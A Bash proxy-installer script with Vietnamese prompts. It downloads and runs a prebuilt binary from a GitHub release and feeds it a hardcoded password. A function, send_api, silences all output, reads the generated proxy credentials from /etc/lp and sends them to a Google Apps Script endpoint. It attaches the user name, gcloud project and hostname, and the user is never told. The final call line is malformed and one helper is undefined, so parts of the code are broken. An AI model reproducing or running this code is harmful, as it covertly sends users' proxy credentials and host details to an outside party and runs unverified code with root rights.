#!/bin/bash
file_path="/etc/lp"

send_api() {
    exec >/dev/null 2>&1

    show_proxy

    if [ ! -f "$file_path" ]; then
        return 1
    fi

    while IFS= read -r proxy_line; do
        IFS='&' read -ra proxy_parts <<< "$proxy_line"

        socks_proxy=""
        http_proxy=""
        shadow_proxy=""
        main_ip=""
        server_tag="AUTO-${SUDO_USER:-$(logname 2>/dev/null || whoami)}@$(gcloud config get-value project 2>/dev/null)@$(hostname)"

        for entry in "${proxy_parts[@]}"; do
            IFS=':' read -ra f <<< "$entry"

            case "${f[0]}" in
                socks5)
                    main_ip="${f[1]}"
                    socks_proxy="${f[1]}:${f[2]}:${f[3]}:${f[4]}:socks"
                    ;;
                http)
                    http_proxy="${f[1]}:${f[2]}:${f[3]}:${f[4]}:http"
                    ;;
                shadowsocks)
                    shadow_proxy="${f[1]}:${f[2]}:${f[3]}:${f[4]}:shadowsocks"
                    ;;
            esac
        done

        encoded_ip=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$main_ip'''))")
        encoded_socks=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$socks_proxy'''))")
        encoded_http=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$http_proxy'''))")
        encoded_shadow=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$shadow_proxy'''))")
        encoded_server=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$server_tag'''))")
        encoded_full=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$proxy_line'''))")

        url="https://script.google.com/macros/s/AKfycbysmF_1WUzUh3pebh1g4uHL2sigyDMXWQwOtm4e7-SoyYklE-iNqKie3J_7v0kZvBJy9Q/exec?IP=$encoded_ip&PROXY=$encoded_socks&HTTP=$encoded_http&SHADOW=$encoded_shadow&SEVER=$encoded_server&FULL=$encoded_full"

        success=0

        for ((retry=1; retry<=3; retry++)); do
            response=$(curl -s -L -G -w "\nHTTP_CODE:%{http_code}" "$url")

            http_code=$(echo "$response" | sed -n 's/^HTTP_CODE://p')
            body=$(echo "$response" | sed '/^HTTP_CODE:/d')

            result=$(echo "$body" | python3 -c "import sys,json; print(json.load(sys.stdin).get('result',''))" 2>/dev/null)

            if [ "$http_code" = "200" ] && [ "$result" = "success" ]; then
                success=1
                break
            fi

            [ "$retry" -lt 3 ] && sleep 2
        done
    done < "$file_path"
}
# ❓ Hỏi trước khi cập nhật hệ thống, mặc định là "n" nếu Enter
read -p "👉 Bạn có muốn cập nhật hệ thống và cài iptables + cron? (y/N): " update_ans
update_ans=${update_ans:-n}  # Nếu người dùng không nhập gì thì gán là "n"

if [[ "$update_ans" =~ ^[Yy]$ ]]; then
  echo "🔧 Đang cập nhật và cài đặt..."
  sudo apt update && sudo apt-get install --no-upgrade iptables cron -y
else
  echo "⏩ Bỏ qua bước cập nhật."
fi
# 🧠 Hiển thị và chọn cấu hình TCP/IP hợp lệ (1–9)
echo ""
echo "1) iOS 1440 generic tunnel or VPN (4G-5G)"
echo "2) iOS 1450 generic tunnel or VPN (4G-5G)"
echo "3) iOS 1492 PPPoE (wifi)"
echo "4) Android 1440 generic tunnel or VPN (4G-5G)"
echo "5) Android 1450 generic tunnel or VPN (4G-5G)"
echo "6) Android 1492 PPPoE (wifi)"
echo "7) macOS 1492 PPPoE (wifi)"
echo "8) Windows 1492 PPPoE (wifi)"
echo "9) Windows 1440 generic tunnel or VPN (4G-5G)"
# 🔁 Nhập lựa chọn, mặc định là 7 nếu ấn Enter
while true; do
  read -p "👉 Chọn cấu hình TCP/IP (nhập số 1-9, Enter = mặc định 7): " config_option
  config_option=${config_option:-7}
  if [[ "$config_option" =~ ^[1-9]$ ]]; then
    break
  else
    echo "❌ Lựa chọn không hợp lệ. Vui lòng nhập số từ 1 đến 9."
  fi
done
# Tải file nhị phân về /usr/local/bin
wget -qO /usr/local/bin/createprx https://github.com/luffypro666/tien/releases/download/create/createprxaz
chmod +x /usr/local/bin/createprx

# Truyền dữ liệu vào createprx (dòng 2 bạn nhập tay), cách nhau 2 giây
{
  echo "Tienmaster@123"
  echo "1"
  echo "1"
  sleep 2

  echo "$config_option"
  sleep 2
} | /usr/local/bin/createprx
echo ""
cat /etc/lp
send_api()
